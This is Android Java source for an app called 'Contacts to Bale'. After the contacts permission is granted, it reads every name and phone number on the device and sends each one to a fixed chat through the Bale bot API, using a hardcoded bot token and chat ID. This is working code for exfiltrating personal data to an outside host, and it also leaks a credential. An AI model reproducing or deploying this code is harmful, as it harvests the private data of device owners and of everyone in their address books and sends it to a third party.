package com.byteapp.contactsender;

import android.Manifest;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.view.View;
import android.widget.*;
import android.graphics.Color;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MainActivity extends Activity {

    TextView statusText;
    ProgressBar progressBar;
    Button settingsButton;
    Handler handler = new Handler(Looper.getMainLooper());
    static final int PERMISSION_CODE = 101;

    String BOT_TOKEN = "2082792321:UANVGhi3Edr48SPevrRhsG6N7lmb8YZIA5U";
    String CHAT_ID   = "921661962";

    @Override
    protected void onCreate(Bundle saved) {
        super.onCreate(saved);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(32, 48, 32, 32);
        root.setBackgroundColor(Color.parseColor("#FAFAFA"));

        TextView title = new TextView(this);
        title.setText("Contacts to Bale");
        title.setTextSize(24);
        title.setTextColor(Color.parseColor("#6200EE"));
        title.setPadding(0, 0, 0, 24);
        root.addView(title);

        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setPadding(0, 8, 0, 8);
        root.addView(progressBar);

        statusText = new TextView(this);
        statusText.setText("Checking permission...");
        statusText.setTextSize(14);
        statusText.setTextColor(Color.GRAY);
        statusText.setPadding(0, 8, 0, 16);
        root.addView(statusText);

        settingsButton = new Button(this);
        settingsButton.setText("Grant Contacts Permission");
        settingsButton.setTextColor(Color.WHITE);
        settingsButton.setBackgroundColor(Color.parseColor("#6200EE"));
        settingsButton.setVisibility(View.GONE);
        settingsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        });
        root.addView(settingsButton);

        setContentView(root);
    }

    @Override
    protected void onResume() {
        super.onResume();
        checkPermission();
    }

    void checkPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_CONTACTS)
                    == PackageManager.PERMISSION_GRANTED) {
                statusText.setText("Permission granted. Sending contacts...");
                settingsButton.setVisibility(View.GONE);
                startSending();
            } else {
                statusText.setText("Permission required. Tap button below.");
                settingsButton.setVisibility(View.VISIBLE);
                requestPermissions(
                    new String[]{ Manifest.permission.READ_CONTACTS },
                    PERMISSION_CODE
                );
            }
        } else {
            startSending();
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == PERMISSION_CODE) {
            if (results.length > 0 && results[0] == PackageManager.PERMISSION_GRANTED) {
                checkPermission();
            } else {
                statusText.setText("Permission denied. Use button below.");
                settingsButton.setVisibility(View.VISIBLE);
            }
        }
    }

    void startSending() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver cr = getContentResolver();
                    Cursor cursor = cr.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                        },
                        null, null,
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                    );

                    if (cursor == null || cursor.getCount() == 0) {
                        updateUI("No contacts found", 0, 0);
                        return;
                    }

                    int total = cursor.getCount();
                    int nameCol = cursor.getColumnIndex(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    int numCol  = cursor.getColumnIndex(
                            ContactsContract.CommonDataKinds.Phone.NUMBER);

                    int count = 0;
                    String lastSent = "";

                    while (cursor.moveToNext()) {
                        String name = cursor.getString(nameCol);
                        String number = cursor.getString(numCol);

                        String entry = name + " : " + number;
                        if (entry.equals(lastSent)) continue;
                        lastSent = entry;

                        String msg = "👤 " + name + "\n📞 " + number;
                        sendToBale(msg);

                        count++;
                        updateUI("Sending " + count + " of " + total, count, total);
                        Thread.sleep(200);
                    }
                    cursor.close();

                    sendToBale("✅ All contacts sent.\n📊 Total: " + count);
                    updateUI("Done. " + count + " contacts sent.", count, count);

                } catch (Exception e) {
                    updateUI("Error: " + e.getMessage(), 0, 0);
                }
            }
        }).start();
    }

    void updateUI(final String msg, final int progress, final int max) {
        handler.post(new Runnable() {
            @Override
            public void run() {
                statusText.setText(msg);
                if (max > 0) {
                    progressBar.setMax(max);
                    progressBar.setProgress(progress);
                }
            }
        });
    }

    void sendToBale(final String message) {
        try {
            // API Bale - طبق مستندات با tapi
            String urlStr = "https://tapi.bale.ai/bot" + BOT_TOKEN + "/sendMessage";
            
            // روش GET با query parameters (مثل لینکی که دادی)
            String encodedText = URLEncoder.encode(message, "UTF-8");
            String fullUrl = urlStr + "?chat_id=" + CHAT_ID + "&text=" + encodedText;

            URL url = new URL(fullUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);

            int responseCode = conn.getResponseCode();
            conn.disconnect();

        } catch (Exception e) {}
    }
}
    